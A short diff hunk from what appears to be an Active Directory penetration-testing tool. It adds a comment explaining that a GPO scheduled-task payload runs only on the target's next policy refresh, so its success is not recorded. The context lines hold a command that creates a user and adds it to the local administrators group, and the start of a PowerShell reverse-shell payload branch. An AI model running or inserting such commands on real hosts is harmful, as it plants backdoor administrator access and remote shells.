@@ -112,6 +112,17 @@ def _payload_to_command(payload: GPOPayload) -> tuple[str, bool]:
         compound = (
             f"net user {user} {pwd} /add & net localgroup administrators {user} /add"
         )
+        # NOTE: unlike the MSSQL SeImpersonate / HasSession attack steps, this
+        # command does NOT run synchronously under ADscan's control — it only
+        # gets written into the planted ScheduledTasks.xml and executes on the
+        # target host's OWN next `gpupdate` cycle, entirely outside this
+        # process. There is no confirmed-success signal here to hook the
+        # runtime-membership SSOT (membership_snapshot.add_runtime_*) onto:
+        # recording a membership before it is proven would be a false
+        # positive (CLAUDE.md § Exposure Validation — record only what
+        # ADscan has PROVEN). See BACKLOG.md "GPO Immediate Scheduled Task
+        # add_local_admin payload" for the trigger to revisit once a
+        # post-gpupdate verification poll exists.
         return compound, False
     if payload.kind == "reverse_shell_ps_b64":
         ip = str(payload.params.get("ip", "")).strip()
